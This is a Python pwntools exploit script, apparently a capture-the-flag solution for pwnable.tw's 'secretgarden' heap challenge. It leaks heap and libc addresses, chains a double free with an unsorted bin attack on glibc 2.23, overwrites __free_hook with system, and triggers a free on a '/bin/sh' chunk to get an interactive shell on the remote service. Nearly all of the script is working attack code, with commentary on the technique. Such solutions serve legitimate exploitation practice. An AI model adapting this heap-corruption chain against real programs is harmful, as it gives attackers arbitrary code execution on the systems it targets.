from pwn import *

local = False

if local:
	r = process("./secretgarden")
	#gdb.attach(r)
	malloc_hook = 0x3c4b10
	free_hook = 0x3c67a8
	sys_off = 0x45390
	binsh_off = 0x18cd57
else:
	r = remote("chall.pwnable.tw", 10203)	
	malloc_hook = 0x3c3b10
	free_hook = 0x3c57a8
	sys_off = 0x45390
	binsh_off = 0x18c177

r.recvuntil("Your choice :")

def add(size, name, color):
	r.sendline(str(1))
	r.recvuntil("Length of the name :")
	r.sendline(str(size))
	r.recvuntil("The name of flower :")
	r.send(name)
	r.recvuntil("The color of the flower :")
	r.sendline(color)
	r.recvuntil("Your choice :")
def visit():
	r.sendline(str(2))
	return r.recvuntil("Your choice :")
def remove(index):
	r.sendline(str(3))
	r.sendlineafter(":", str(index))
	r.recvuntil("Your choice :")
def clean():	
	r.sendline(str(4))
	r.recvuntil("Your choice :")
# setup
# 0 
add(0x50, "\n", "color0")
# 1
add(0x50, "\n", "color1")
# 2
payload = p64(0)*2
payload += p64(0) + p64(0x21)
add(0x100, payload, "color2")
# 3
add(0x28, "\n", "color3")
# need to setup now
# because after unsorted bin attack, we can not malloc these chunk
# because fastbin is empty and unsorted bin being corrupted
# 4
add(0x60, "\n", "color4")
# 5
add(0x60, "\n", "color5")
# 6
add(0x28, "\n", "color6")

# leak heap_base address base on single link list of fastbin
remove(0)
remove(1)
clean()

# 0 -> duoi
add(0x50, "\n", "color1")

result = visit()
result = result.split("Name of the flower[0] :")[1][:6] + "\x00\x00"
heap_base = u64(result) - 0xa - 0x1000
print "Heap_base = " + hex(heap_base)

# back on setup
# 1 -> tren
add(0x50, "\n", "color1")

# leak libc_base addr base on chunk 0x110, malloc_hook = main_arena - 0x10
remove(2)
clean()
add(0x100, "aaaabbbb", "color2")

result = visit()
result = result.split("bbbb")[1][:6] + "\x00\x00"
libc_base = u64(result) - 88 - 0x10 - malloc_hook
free_hook_addr = libc_base + free_hook
sys_addr = libc_base + sys_off
binsh_addr = libc_base + binsh_off
print "Libc_base = " + hex(libc_base)

# double free vulnerability
# abusing heap
# ---> unsorted bin attack
remove(0)
remove(1)
remove(0)
clean()

# base on double free make malloc return a fake chunk on #0 and overwrite chunk #2 (freeing)
# 0 
fake_chunk_addr = heap_base + 0x30 + 0x1010 + 0x60 + 0x30 + 0x50
name = p64(fake_chunk_addr) + "\x00"*0x40 + p64(0x61)
add(0x50, name, "color0")

# 1
add(0x50, "\n", "color1")

# 7
add(0x50, "\n", "color4")

# avoid malloc on chunk #2
remove(3)

# free chunk 0x100
# setup for unsorted bin attack
remove(2)

clean()

# overwrite chunk #2
# write a value on the position above free_hook to set up meta data of chunk, and later we will malloc on it
payload = p64(0) + p64(0x31)
payload += p64(0) + p64(fake_chunk_addr + 0x50)
payload += p64(0)*2
payload += p64(0) + p64(0x111)
payload += p64(libc_base + malloc_hook + 0x10 + 88) + p64(free_hook_addr - 0x50)
# 2
add(0x50, payload, "nocolor")


# this malloc will trigger unsorted bin attack
# 3.2 + 2.1
add(0x100, "\n", "nocolor")

# Now, free_hook not surrounded by NULL byte, double free here to overwrite free_hook
# 0x71 or 0x7f are accepted when checking by malloc <--- LOL
# Not checking for alignment like 32bit <--- LOL
# 2 error fun vl for glibc2.23 64bit

# ALERT: weakness of unsorted bin attack:
# from now on we can not malloc if there is no free chunk in fastbin list
# because if fastbin is empty, it will take chunk in main_arena.bins.bk
# and we just overwrite this field so this cause corrupt

# So we need to malloc in setup, so now we can free -> fastbin not empty anymore -> malloc <- this what we need

# double free
remove(4)
remove(5)
remove(4)
remove(6)
clean()

target = free_hook_addr - 0x43
name = p64(target)
# 4
add(0x60, name, "color5")
# 5
add(0x60, "/bin/sh", "color6")
# 6
add(0x60, "\n", "color7")
# overwrite free_hook by system
# 7
payload = "\x00"*0x33 + p64(sys_addr)
add(0x60, payload, "color7")

#remove(5)
r.sendline(str(3))
r.sendlineafter(":", str(5))

r.interactive()

# How double free vulnerability ruins __free_hook
# unsorted bin attack
